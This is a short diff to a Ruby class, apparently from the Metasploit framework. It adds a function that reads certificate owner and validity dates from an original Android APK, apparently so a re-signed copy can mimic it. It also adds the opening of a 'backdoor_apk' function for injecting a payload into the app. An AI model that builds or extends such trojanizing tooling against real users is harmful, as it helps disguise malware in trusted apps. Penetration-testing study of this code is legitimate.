@@ -119,3 +119,26 @@ class MSF::Payload::Apk
 
     File.open("#{tempdir}/orignial/AndroidManifest.xml", "wb") { |file| file.puts original_manifest.to_xml}
   end
+  
+  def parse_orig_cert_data(orig_apkfile)
+      orig_cert_data = Array[]
+      keytool_output = run_cmd("keytool -J-Duser.language=en -printcert -jarfile '#{orig_apkfile}'")
+      owner_line = keytool_output.match(/^Owner:.+/)[0]
+      orig_cert_dname = owner_line.gsub(/^.*:/, '').strip
+      orig_cert_data.push("#{orig_cert_dname}")
+      valid_from_line = keytool_output.match(/^Valid from:.+/)[0]
+      from_date_str = valid_from_line.gsub(/^Valid from:/, '').gsub(/until:.+/, '').strip
+      to_date_str = valid_from_line.gsub(/^Valid from:.+until:/, '').strip
+      from_date = DateTime.parse("#{from_date_str}")
+      orig_cert_data.push(from_date.strftime("%Y/%m/%d %T"))
+      to_date = DateTime.parse("#{to_date_str}")
+      validity = (to_date - from_date).to_i
+      orig_cert_data.push("#{validity}")
+      return orig_cert_data
+  end
+  
+  def backdoor_apk(apkfile, raw_payload)
+      unless apkfile && File.readable?(apkfile)
+          usage
+          raise RuntimeError, "Invalid template: #{apkfile}"
+      end
